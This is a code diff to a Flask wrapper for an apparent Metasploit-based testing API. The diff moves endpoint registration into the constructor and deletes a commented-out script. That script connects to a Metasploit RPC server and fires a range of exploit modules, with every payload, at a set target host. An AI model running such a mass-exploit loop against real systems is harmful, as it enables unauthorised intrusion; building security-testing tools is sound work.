@@ -28,6 +28,8 @@ class FlaskAppWrapper(object):
 
     def __init__(self):
         self._api = Api(app=FlaskAppWrapper.app)
+        self.add_all_endpoints()
+        # self.run()
 
     @app.errorhandler(HttpCodes.NOT_FOUND)
     def invalid_urls_error(self):
@@ -230,36 +232,3 @@ class FlaskAppWrapper(object):
             methods=[HttpMethods.GET],
             resource_class_kwargs=metasploit_controller_kwargs,
         )
-
-
-# from metasploit.api.connections import Metasploit
-#
-#
-# def results(client, uuid):
-#     return client.call('module.results', [uuid])
-#
-# source_host = '3.18.101.73'
-# m = Metasploit(server=source_host, port=50000)
-# target_host = '172.17.0.3'
-# result = []
-# for e in m.exploits[360:500]:
-#     try:
-#         exploit = m.metasploit_client.modules.use('exploit', mname=e)
-#         if 'RHOSTS' in exploit.options:
-#             exploit['RHOSTS'] = target_host
-#             for p in exploit.targetpayloads():
-#                 res = exploit.execute(payload=p)
-#                 if res['job_id'] and res['job_id'] in m.metasploit_client.jobs.list:
-#                     print(results(client=m.metasploit_client, uuid=res['uuid']))
-#                 print(m.metasploit_client.jobs.list)
-#                 print(res)
-#
-#     except Exception as e:
-#         print(e)
-
-# print(m.exploits)
-
-
-flask_wrapper = FlaskAppWrapper()
-flask_wrapper.add_all_endpoints()
-flask_wrapper.run()
